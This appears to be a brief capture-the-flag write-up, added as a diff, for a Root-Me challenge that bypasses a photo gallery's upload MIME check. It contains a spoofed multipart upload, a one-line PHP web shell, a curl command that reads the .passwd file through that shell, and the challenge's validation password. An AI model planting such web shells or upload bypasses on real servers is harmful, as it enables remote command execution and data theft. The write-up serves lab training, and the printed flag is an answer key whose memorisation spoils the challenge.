@@ -1,0 +1,21 @@
+WebServer Challenge 21 - File Upload Mime Type
+
+Synopsis: Your goal is to hack this photo galery by uploading PHP code.
+Retrieve the validation password in the file .passwd.
+
+
+By changing the Content-Type in the HTTP upload to a supported format such as: Content-Type: image/jpeg
+
+Content-Disposition: form-data; name="file"; filename="x.php"
+Content-Type: image/jpeg
+
+<?php
+system($_GET['c']);
+?>
+
+
+
+We were able to upload x.php and retrieve the password:
+curl http://challenge01.root-me.org/web-serveur/ch21/galerie/upload/vtdokqi3eu5u5d12lsl5m4b9r6//x.php?c="cat ../../../.passwd"
+
+a7n4nizpgQgnPERy89uanf6T4
